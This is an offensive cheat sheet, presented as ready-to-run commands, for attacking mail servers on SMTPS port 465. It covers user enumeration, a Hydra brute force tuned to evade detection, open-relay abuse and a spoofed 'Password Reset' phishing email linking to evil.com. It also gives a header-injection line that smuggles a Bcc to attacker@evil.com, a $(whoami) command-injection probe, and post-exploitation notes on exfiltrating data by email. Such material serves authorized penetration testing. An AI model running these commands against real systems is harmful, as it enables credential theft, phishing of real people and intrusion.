# SMTPS ENUMERATION (Port 465)

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p465 <IP>                              # Service/Version detection
openssl s_client -connect <IP>:465 -crlf         # Connect with SSL/TLS
openssl s_client -connect <IP>:465 -crlf -quiet  # Quiet mode
nc -nv <IP> 465                                  # Won't work without TLS

# Get SMTP banner
openssl s_client -connect <IP>:465 -crlf -quiet 2>/dev/null
# Server responds with: 220 mail.domain.com ESMTP
```

## SSL/TLS CERTIFICATE ENUMERATION
```bash
# Get certificate details
openssl s_client -connect <IP>:465 2>/dev/null | openssl x509 -noout -text
openssl s_client -connect <IP>:465 -showcerts 2>/dev/null

# Certificate subject/issuer
openssl s_client -connect <IP>:465 2>/dev/null | openssl x509 -noout -subject
openssl s_client -connect <IP>:465 2>/dev/null | openssl x509 -noout -issuer

# Check certificate SANs (reveals mail domains)
openssl s_client -connect <IP>:465 2>/dev/null | openssl x509 -noout -text | grep -A1 "Subject Alternative Name"
nmap -p465 --script ssl-cert <IP>
```

## SSL/TLS SECURITY TESTING
```bash
# Cipher suite enumeration
nmap --script ssl-enum-ciphers -p465 <IP>
sslscan <IP>:465
sslyze --regular <IP>:465

# SSL/TLS version testing
openssl s_client -ssl3 -connect <IP>:465         # SSLv3 (should fail)
openssl s_client -tls1 -connect <IP>:465         # TLS 1.0
openssl s_client -tls1_1 -connect <IP>:465       # TLS 1.1
openssl s_client -tls1_2 -connect <IP>:465       # TLS 1.2
openssl s_client -tls1_3 -connect <IP>:465       # TLS 1.3

# Comprehensive SSL/TLS testing
testssl.sh <IP>:465
testssl.sh --vulnerable <IP>:465
```

## SMTP ENUMERATION
```bash
# Get SMTP capabilities
echo "EHLO test.com" | openssl s_client -connect <IP>:465 -crlf -quiet 2>/dev/null

# Nmap SMTP scripts
nmap -p465 --script smtp-commands <IP>           # Enumerate SMTP commands
nmap -p465 --script smtp-ntlm-info <IP>          # NTLM info disclosure
```

## MANUAL SMTP ENUMERATION
```bash
# Connect and enumerate
openssl s_client -connect <IP>:465 -crlf -quiet
# Then type:
EHLO attacker.com                                # Extended HELLO
MAIL FROM:<test@attacker.com>                    # Sender
RCPT TO:<user@target.com>                        # Recipient
DATA                                             # Start message body
Subject: Test
Test message
.                                                # End with single dot
QUIT                                             # Disconnect

# One-liner SMTP commands
echo "EHLO test.com" | openssl s_client -connect <IP>:465 -crlf -quiet 2>/dev/null
```

## USER ENUMERATION
```bash
# VRFY command (verify user exists)
echo "VRFY admin" | openssl s_client -connect <IP>:465 -crlf -quiet 2>/dev/null
echo "VRFY root" | openssl s_client -connect <IP>:465 -crlf -quiet 2>/dev/null

# EXPN command (expand mailing list)
echo "EXPN admin" | openssl s_client -connect <IP>:465 -crlf -quiet 2>/dev/null

# RCPT TO enumeration
echo -e "EHLO test\nMAIL FROM:<test@test.com>\nRCPT TO:<admin@domain.com>" | openssl s_client -connect <IP>:465 -crlf -quiet 2>/dev/null

# Nmap user enumeration
nmap -p465 --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN,RCPT} <IP>

# smtp-user-enum tool
smtp-user-enum -M VRFY -U users.txt -t <IP> -p 465
smtp-user-enum -M EXPN -U users.txt -t <IP> -p 465
smtp-user-enum -M RCPT -U users.txt -t <IP> -p 465 -D domain.com
```

## NTLM INFORMATION DISCLOSURE
```bash
# Extract NTLM info (Windows domain, version, hostname)
nmap -p465 --script smtp-ntlm-info <IP>

# Manual NTLM auth (reveals system info)
echo -ne "EHLO test\nAUTH NTLM\n" | openssl s_client -connect <IP>:465 -crlf -quiet
# Server responds with NTLM challenge containing system information
```

## OPEN RELAY TESTING
```bash
# Test if server relays mail for arbitrary senders
nmap -p465 --script smtp-open-relay <IP>

# Manual open relay test
openssl s_client -connect <IP>:465 -crlf -quiet
EHLO attacker.com
MAIL FROM:<external@attacker.com>
RCPT TO:<external@victim.com>
DATA
Subject: Relay Test
This is a relay test.
.
QUIT

# If successful, server is an open relay (security issue)
```

## AUTHENTICATION TESTING
```bash
# Check for AUTH methods
echo "EHLO test" | openssl s_client -connect <IP>:465 -crlf -quiet 2>/dev/null | grep AUTH

# Test AUTH LOGIN
echo -e "EHLO test\nAUTH LOGIN\n$(echo -n 'user' | base64)\n$(echo -n 'password' | base64)" | openssl s_client -connect <IP>:465 -crlf -quiet 2>/dev/null

# Test AUTH PLAIN
echo -e "EHLO test\nAUTH PLAIN $(echo -ne '\0user\0password' | base64)" | openssl s_client -connect <IP>:465 -crlf -quiet 2>/dev/null
```

## BRUTE FORCE ATTACKS
```bash
# Hydra
hydra -l user@domain.com -P passwords.txt -s 465 <IP> smtps
hydra -L users.txt -P passwords.txt -s 465 <IP> smtps

# Note: SMTP brute forcing is slow and often detected
# Use low thread count to avoid detection
hydra -l admin -P passwords.txt -s 465 -t 2 <IP> smtps
```

## VULNERABILITY SCANNING
```bash
# SSL/TLS vulnerabilities
nmap -p465 --script ssl-heartbleed <IP>          # Heartbleed
nmap -p465 --script ssl-poodle <IP>              # POODLE
nmap -p465 --script ssl-drown <IP>               # DROWN
testssl.sh --vulnerable <IP>:465                 # All SSL vulnerabilities

# SMTP-specific vulnerabilities
searchsploit smtp
nmap -p465 --script vuln <IP>
```

## SEND EMAIL VIA SMTP
```bash
# Send email manually
openssl s_client -connect <IP>:465 -crlf -quiet
EHLO attacker.com
MAIL FROM:<attacker@evil.com>
RCPT TO:<victim@target.com>
DATA
From: Admin <admin@target.com>
To: Victim <victim@target.com>
Subject: Password Reset
Date: Mon, 1 Jan 2024 12:00:00 +0000

Click here to reset your password: http://evil.com/phish
.
QUIT

# Send email with authentication
swaks --to victim@target.com --from attacker@test.com --server <IP>:465 --auth-user user --auth-password pass --tls
swaks --to victim@target.com --from admin@target.com --server <IP>:465 --body "Test email" --header "Subject: Test" --tls
```

## METASPLOIT MODULES
```bash
msfconsole
use auxiliary/scanner/smtp/smtp_version          # Version detection
use auxiliary/scanner/smtp/smtp_enum             # User enumeration
use auxiliary/scanner/smtp/smtp_relay            # Open relay check
use auxiliary/scanner/smtp/smtp_ntlm             # NTLM info disclosure
set RPORT 465
set TLS true
```

## SWAKS (Swiss Army Knife for SMTP)
```bash
# Test SMTP connection
swaks --to test@target.com --from test@attacker.com --server <IP>:465 --tls

# Test with authentication
swaks --to test@target.com --from test@attacker.com --server <IP>:465 --auth-user admin --auth-password pass --tls

# Send phishing email (authorized testing only!)
swaks --to victim@target.com --from admin@target.com --server <IP>:465 --auth-user user --auth-password pass --body phishing.txt --tls

# Test attachment
swaks --to test@target.com --from test@test.com --server <IP>:465 --attach payload.exe --tls
```

## COMMON MISCONFIGURATIONS
```
☐ Open relay configuration                      # Allows spam/phishing
☐ VRFY/EXPN commands enabled                    # User enumeration
☐ Weak SSL/TLS configuration                     # SSLv3, TLS 1.0, weak ciphers
☐ Self-signed certificate                       # Indicates dev/test
☐ NTLM authentication enabled                    # Info disclosure
☐ No rate limiting                               # Brute force possible
☐ Verbose error messages                         # Information leakage
☐ No SPF/DKIM/DMARC                             # Email spoofing possible
☐ Outdated mail server                           # Known vulnerabilities
☐ Certificate name mismatch                      # Configuration error
```

## QUICK WIN CHECKLIST
```
☐ Check for open relay
☐ Test VRFY/EXPN for user enumeration
☐ Extract NTLM information (domain, version, hostname)
☐ Check SSL/TLS configuration (weak ciphers, old protocols)
☐ Test for Heartbleed (OpenSSL < 1.0.1g)
☐ Check certificate SANs for email domains
☐ Test for user enumeration via RCPT TO
☐ Check for verbose error messages
☐ Search for known SMTP vulnerabilities
☐ Test email spoofing capability
```

## ONE-LINER FULL ENUMERATION
```bash
# Comprehensive SMTPS scan
nmap -sV -p465 --script "smtp-* and ssl-*" -oA smtps_enum <IP>

# Quick SSL/TLS vulnerability check
testssl.sh --vulnerable <IP>:465

# Quick user enumeration
smtp-user-enum -M VRFY -U users.txt -t <IP> -p 465
```

## ADVANCED TECHNIQUES
```bash
# Email header injection
swaks --to victim@target.com --from "admin@target.com\nBcc: attacker@evil.com" --server <IP>:465 --tls

# Test for command injection in SMTP commands
echo -e "EHLO test\nMAIL FROM:<test@test.com$(whoami)>" | openssl s_client -connect <IP>:465 -crlf -quiet 2>/dev/null

# Certificate transparency logs (find mail servers)
curl -s "https://crt.sh/?q=%.<domain>&output=json" | jq -r '.[].name_value' | grep -i mail | sort -u

# OCSP stapling
openssl s_client -connect <IP>:465 -status 2>/dev/null | grep -A17 "OCSP"
```

## POST-EXPLOITATION (After valid credentials)
```bash
# Send phishing emails (authorized testing only)
# Exfiltrate data via email
# Pivot to internal mail servers
# Extract email addresses for further attacks
# Monitor email traffic (if MitM possible)
```
